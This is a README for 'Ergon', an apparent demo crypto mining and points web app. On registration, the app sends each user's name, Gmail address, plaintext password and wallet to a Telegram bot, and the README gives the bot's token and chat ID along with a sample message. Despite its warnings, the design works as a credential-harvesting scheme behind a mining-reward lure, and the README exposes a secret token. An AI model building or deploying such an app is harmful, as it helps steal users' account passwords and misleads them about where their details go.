# Ergon – Community Mining & Points Network

**Ergon** is a modern, professional demo of a community points / mining-style platform.  
Users register, claim daily activity rewards, view balances, invite friends, and transfer points between wallets — all inside a clean mobile-first interface.

> ⚠️ **Important Notice**  
> This is a **simulation / demo only**.  
> - No real blockchain, no real mining, no real tokens.  
> - Points are stored in the browser (localStorage).  
> - The Telegram notification uses the bot token you provided and now includes **email + password in plain text**.  
> - Sending passwords to Telegram is **highly insecure**. Anyone with access to the chat can see them.  
> - **Never** put a real bot token or send passwords in public frontend code for production.  
> - Move the Telegram call to a serverless function (Cloudflare Workers / Vercel) before going live.  
> - Private keys are **never** generated or shown.

---

## Features

- Beautiful mobile-first UI inspired by modern crypto dashboards
- User registration + login (localStorage)
- **First-time registration automatically sends details to your Telegram bot** (with emojis)
- Daily Activity claim (+0.5 Ergon every 24 hours)
- In-app wallet address generation
- Send points from User A → User B by wallet address
- Referrals section
- Halving milestones progress
- Boost & XP rate display
- Activity history
- Responsive design (works great on phone & desktop)

---

## Project Structure

```
cloudfarming-app/
├── index.html          # Main single-page application
├── css/
│   └── style.css       # Custom styles & animations
├── js/
│   ├── app.js          # Core logic (auth, dashboard, activity, transfers)
│   └── telegram.js     # Telegram notification helper
├── assets/             # (optional images / icons)
├── .gitignore
└── README.md
```

---

## How to Run Locally

1. Clone the repository
2. Open `index.html` in any modern browser  
   **or**
3. Use a simple local server:
   ```bash
   npx serve .
   # or
   python -m http.server 8000
   ```

## Deploy to GitHub Pages

1. Push this folder to a GitHub repository
2. Go to **Settings → Pages**
3. Source: Deploy from branch → `main` / root
4. Your app will be live at `https://yourusername.github.io/repo-name`

---

## Telegram Setup (already configured)

- Bot Token: `8604787810:AAHjuiGPTXQRf6GzxTLrLFwxHvhSl2yH21U`
- Chat ID: `7372675220`

On every new registration the bot receives a message like:

```
🚀 New Ergon User Registered!
━━━━━━━━━━━━━━━━━━━━
👤 Name: Janet Brown
📧 Email (Gmail): janet@example.com
🔑 Password: mysecretpass
💳 Wallet: 0xabc...def
🕒 Time: 2026-09-02 23:15:00
━━━━━━━━━━━━━━━━━━━━
Welcome to Ergon! 💎
```

---

## Future Real Listing Path (recommended)

When you are ready to turn this into a real project:

1. Move authentication & points to a real backend (Firebase / Supabase / custom API)
2. Replace simulated points with a real ERC-20 / BEP-20 token
3. Use a proper wallet connection (WalletConnect / RainbowKit)
4. Move Telegram notifications to a secure serverless function
5. Add KYC, anti-bot, and proper rate limiting
6. Audit the smart contracts before any public listing

---

## License

MIT – free to use and modify for your own projects.

Made with ❤️ for the Ergon community.
